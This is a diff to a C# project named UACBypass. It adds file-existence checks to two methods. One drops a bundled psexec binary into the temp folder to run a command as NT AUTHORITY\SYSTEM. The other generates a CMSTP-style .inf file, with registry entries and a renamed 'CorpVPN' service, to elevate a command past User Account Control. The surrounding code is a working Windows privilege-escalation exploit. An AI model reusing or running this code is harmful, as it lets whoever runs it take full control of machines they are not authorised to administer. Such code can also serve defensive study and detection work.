@@ -41,12 +41,15 @@ namespace UACBypass
         /// </summary>
         /// <exception cref="AdminPrivilegesException">Thrown if the application is not running as
         /// Administrator.</exception>
+        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
         public static void startAsNTAuthoritySystem(string CommandToExecute)
         {
             if(!Win32.IsRunAsAdmin())
             {
                 throw new AdminPrivilegesException("This function requires that the application is running as administrator.");
             }
+
+            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");
 
             //write the psexec binary into the TEMP path.
             if (Environment.Is64BitOperatingSystem) File.WriteAllBytes(Path.GetTempPath() + "\\psexec.exe", Properties.Resources.psexec64);
@@ -99,8 +102,8 @@ namespace UACBypass
         ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
 
         [Strings]
-        ServiceName=""chicagoVPN""
-        ShortSvcName=""chicagoVPN""
+        ServiceName=""CorpVPN""
+        ShortSvcName=""CorpVPN""
 
         ";
 
@@ -143,6 +146,7 @@ namespace UACBypass
         /// Administrator.</exception>
         /// <exception cref="InvalidUACConfigurationException">Thrown if the current configuration of the User Account Control (UAC)
         /// is not supported by this method.</exception>
+        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
         public static bool autoElevate(string CommandToExecute)
         {
             if (!File.Exists(BinaryPath))
@@ -153,7 +157,9 @@ namespace UACBypass
             if(Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
 
             if (!UAC.canBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
-            
+
+            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");
+
             //generate the .inf file.
             StringBuilder InfFile = new StringBuilder();
             InfFile.Append(SetInfFile(CommandToExecute));
